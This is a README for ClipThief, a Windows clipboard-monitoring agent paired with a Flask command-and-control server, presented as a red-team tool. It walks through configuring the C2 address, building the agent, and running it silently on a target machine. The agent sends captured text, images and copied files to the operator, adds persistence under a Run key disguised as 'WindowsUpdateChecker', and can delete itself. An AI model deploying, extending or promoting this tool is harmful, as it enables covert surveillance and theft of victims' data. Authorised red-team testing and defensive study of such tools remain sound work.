```
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⡿⣿⣿⣿
⡿⠟⠫⠋⢉⣁⣉⡉⠉⠉⠋⠛⣿⣿⣿⡛⠋⠋⠉⠉⣁⣈⣉⡐⠩⠛⢻
⣷⣦⣶⣿⡿⠯⠭⠭⠭⠭⣝⢻⣿⣿⣿⡿⢫⠭⠭⠭⠭⠭⠿⣿⣷⣦⣼
⣿⣿⣿⣩⡚⠃⢀⠀⡘⠌⢻⣸⣿⣿⣿⣷⣼⣋⢚⢀⣀⢀⠛⣊⣽⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿     Be careful what you copy. 
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⣼⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⢋⣿⡟⣸⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⢙⣛⣛⣛⣛⣛⣛⣛⣉⣩⣭⣴⣾⣿⣿⢣⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢿⣼⣿⣿⣿⣿

```

# ClipThief

Windows clipboard monitoring tool. Developed for red team exercises and security research.

**Author:** @erberkan / B3R-SEC

---

## Components

| Component | Technology | Description |
|-----------|------------|-------------|
| **Agent** | C++ / Win32 API | Runs silently in the background on the target system, monitors clipboard |
| **C2 Server** | Python 3 + Flask + Rich | Operator terminal interface, SQLite database, heartbeat monitoring |

---

## Requirements

### C2 Server
- Python 3.8 or higher
- pip

### Agent (for compilation)
- Windows 10/11
- Visual Studio 2022 (Community or higher)
- Windows 10 SDK

---

## Setup

### 1. C2 Server

```bash
cd C2
pip install -r requirements.txt
```

`requirements.txt` contents:
```
flask>=3.0.0
rich>=13.0.0
```

### 2. Agent — Pre-Build Configuration

Open `ClipboardDump/ClipboardDump/ClipboardDump.cpp` and update the C2 address:

```cpp
// Around line 37
static const char* C2_HOST = "127.0.0.1";  // ← Your C2 server's IP
static const int   C2_PORT = 5000;          // ← C2 port
```

Optional settings:

```cpp
static const int   POLL_MS   = 3000;                   // Command polling interval (ms)
static const char* TASK_NAME = "WindowsUpdateChecker"; // Persistence key name
static const size_t MAX_FILE = 50 * 1024 * 1024;       // Max file size (50 MB)
```

### 3. Agent — Build

1. Open `ClipboardDump/ClipboardDump.sln` with Visual Studio 2022
2. Select **Release | x64** configuration
3. `Build → Build Solution` (or `Ctrl+Shift+B`)
4. Compiled EXE: `ClipboardDump/x64/Release/ClipboardDump.exe`

---

## Usage

### Starting the C2 Server

```bash
cd C2

# Default (0.0.0.0:5000)
python c2_server.py

# Custom address and port
python c2_server.py --host 192.168.1.100 --port 8080

# Windows batch (auto-installs dependencies)
setup_and_run.bat
```

Successful startup output:
```
[*] Database: C:\...\C2\c2_data.db  (0 agents loaded)
[*] Listening on 0.0.0.0:5000
```

### Running the Agent

Execute the compiled `ClipboardDump.exe` on the target system.

- No console window appears (Windows subsystem / WinMain)
- Visible in Task Manager as `ClipboardDump.exe`
- Silently waits if C2 is unreachable
- Sends a command query to C2 every 3 seconds (also serves as heartbeat)

---

## C2 Interface

### Main Screen

```
╭──────────────────────────────────────────────────────────────────────╮
│                                                                      │
│    ClipThief C2  ·  @erberkan / B3R-SEC                              │
│                                                                      │
╰──────────────────────────────────────────────────────────────────────╯

  #    ID           USER             HOSTNAME             IP               LAST SEEN            STATUS
  ───────────────────────────────────────────────────────────────────────────────────────────────────────
  1    a1b2c3d4...  erberkan         DESKTOP-ABC123       192.168.1.50     2026-04-21 14:35:00  ● active
  2    f7e6d5c4...  john             LAPTOP-XYZ           10.0.0.12        2026-04-21 13:10:00  ✗ dead

  [N]  Select agent by number
  [D]  Database management
  [R]  Refresh
  [Q]  Quit
```

- `● active` — Agent polled within the last 10 seconds, alive
- `✗ dead` — More than 10 seconds since last poll, or kill command was sent

### When a New Agent Connects

When an agent connects for the first time, an automatic notification panel appears in the terminal and the agent menu opens:

```
╭────────────────────────────────────────────────────────╮
│                                                        │
│            ★  NEW AGENT CONNECTED  ★                   │
│                                                        │
│  ID      : a1b2c3d4-e5f6-...                          │
│  User    : erberkan                                    │
│  Hostname: DESKTOP-ABC123                              │
│  IP      : 192.168.1.50                                │
│  OS      : Windows 10.0 Build 19045                    │
│  Time    : 2026-04-21 14:32:11                         │
│                                                        │
╰────────────────────────────────────────────────────────╯
  Press Enter to open agent menu...
```

### Agent Menu

```
╭── Agent: a1b2c3d4... ──────────────────────────────────────╮
│  User    : erberkan                                         │
│  Hostname: DESKTOP-ABC123                                   │
│  IP      : 192.168.1.50                                     │
│  OS      : Windows 10.0 Build 19045                         │
│  Status  : ● active                                         │
│  Clips   : 14                                               │
╰─────────────────────────────────────────────────────────────╯

  [1] View clipboard history
  [2] Send KILL command
  [3] Send PERSIST command
  [4] Delete this agent from DB
  [0] Back
```

### Clipboard History

```
  #     TYPE    TIMESTAMP              PREVIEW / FILENAME
  ─────────────────────────────────────────────────────────────────────
  1     [TXT]   2026-04-21 14:32:15    SELECT * FROM users WHERE...
  2     [IMG]   2026-04-21 14:35:01    clipboard.bmp
  3     [FILE]  2026-04-21 14:38:44    salary_report.xlsx
```

Column colors: `[TXT]` → cyan, `[IMG]` → yellow, `[FILE]` → green

Commands:
- `1` — View entry #1 (text shown inline with syntax highlight, images/files open automatically)
- `D 2` — Download entry #2 to `downloads/` folder
- `0` — Back

### Text View (Syntax Highlight)

Text content is automatically colorized with language detection:

| Content | Language | Theme |
|---------|----------|-------|
| Starts with `{` or `[` | JSON | monokai |
| Contains `SELECT`, `INSERT`, `UPDATE`, `DELETE`, `CREATE` | SQL | monokai |
| Contains `def `, `import `, `class ` | Python | monokai |
| Starts with `<?xml`, `<html`, `<root` | XML | monokai |
| Other | Plain text | In Panel |

### Supported Clipboard Types

| Type | Windows Format | C2 Display |
|------|---------------|------------|
| Text | `CF_UNICODETEXT` | Syntax-highlighted inline in terminal |
| Image (screenshot etc.) | `CF_DIB` | Saved as BMP and opened automatically |
| Copied file | `CF_HDROP` | Downloaded with original extension |

---

## Commands

### KILL — Self-Destruct

Select `[2]` from the agent menu. Confirm with:

```
Kill this agent? [y/n]:
```

Confirm with `y`. The agent receives the command on the next poll (max 3 seconds) and:

1. Deletes the `AgentID` value from the registry
2. Removes the persistence Run key if it was set
3. Creates a batch file to delete itself (`%TEMP%`)
4. Terminates the process

> **Note:** EXE deletion is triggered via `ShellExecuteA`; the `.bat` file may not run on some Windows 10/11 environments. In that case the EXE is marked `✗ dead` by C2 but may remain on disk.

### PERSIST — Registry Run Key

Send via `[3]` from the agent menu.

The agent adds itself to the HKCU Run registry key — **no administrator privileges required**:

- **Registry key:** `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
- **Value name:** `WindowsUpdateChecker` (configurable in source)
- **Trigger:** On every user login

To remove manually:
```cmd
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v WindowsUpdateChecker /f
```

---

## Heartbeat & Status

The C2 server checks `last_seen` for all agents every 5 seconds:

- Agent polled within the last 10 seconds → `● active`
- Silent for more than 10 seconds → `✗ dead`

There is no separate heartbeat endpoint; the command query the agent sends every 3 seconds (`GET /api/agent/<id>/command`) automatically updates `last_seen`.

---

## Database Management

Access the database management screen from the main menu with `[D]`:

```
╭── Database ──────────────────────────────────────────────────╮
│  Path     : C:\...\C2\c2_data.db                             │
│  Size     : 2,048,576 bytes                                   │
│  Agents   : 3                                                 │
│  Clipboard: 892 entries                                       │
╰──────────────────────────────────────────────────────────────╯

  [1] Clear ALL data  (agents + clipboard)
  [0] Back
```

- **Delete all data:** `[1]` → confirmation prompt
- **Delete single agent:** Agent Menu → `[4]` → confirmation prompt

When the C2 is restarted, the database is automatically loaded; all history is preserved.

---

## File Structure

```
ClipThief/
├── ClipboardDump/
│   ├── ClipboardDump.sln
│   └── ClipboardDump/
│       ├── ClipboardDump.cpp       # Agent source code (~615 lines)
│       └── ClipboardDump.vcxproj
│
├── C2/
│   ├── c2_server.py                # C2 server (Flask + Rich + SQLite)
│   ├── requirements.txt
│   ├── setup_and_run.bat           # Windows startup script
│   ├── c2_data.db                  # Database (auto-created)
│   └── downloads/                  # Downloaded files
│
├── PROJECT.md                      # Technical documentation (Turkish)
├── PROJECT_EN.md                   # Technical documentation (English)
├── README.md                       # This file (Turkish)
└── README_EN.md                    # This file (English)
```

---

## Troubleshooting

### Agent cannot connect to C2
- Check that `C2_HOST` and `C2_PORT` are correct
- Verify the C2 server is running
- Check that Windows Firewall allows the target port

### Build error: `identifier not found`
- Verify **Release | x64** configuration is selected in Visual Studio
- Check that Windows 10 SDK is installed (`Tools → Get Tools and Features`)
- If you get a `CoCreateGuid` error: `rpcrt4.lib` linker dependency must be present (project is already configured)

### Clipboard changes not reaching C2
- Verify the agent is running as `ClipboardDump.exe` in Task Manager
- Check that the agent ID's `last_seen` is being updated in C2 logs

### Agent status shows dead but it's running
- There may be network latency between the C2 server and agent; the 10-second timeout may be too short
- You can increase `AGENT_TIMEOUT_SEC` in `c2_server.py` (default: 10)

### Downloaded image won't open
- The `.bmp` file in `downloads/` can be opened with Windows Photo Viewer
- Large screenshots may produce large BMP files (uncompressed format)

### Rich dependency not installed
```bash
pip install rich>=13.0.0
```
Rich is not optional — it is a required dependency for the C2.

---

## Technical Details

For a complete description of the architecture, documentation of all functions, and data flow diagrams, see `PROJECT.md`.
